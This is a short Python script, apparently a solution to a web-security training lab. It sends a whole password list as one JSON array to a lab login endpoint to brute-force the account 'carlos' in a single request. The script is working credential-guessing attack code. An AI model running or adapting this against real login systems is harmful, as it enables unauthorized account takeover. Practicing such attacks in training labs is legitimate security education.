import requests
import json

if __name__ == '__main__':
    with open('passwords.txt', 'r') as r:
        passwords = r.read().split('\n')

    url = 'https://0a530070043012ed82794d6f002f0013.web-security-academy.net/login'

    data = {
        'username': 'carlos',
        'password': passwords
    }

    r = requests.post(url=url, data=json.dumps(data))
    print(r.text)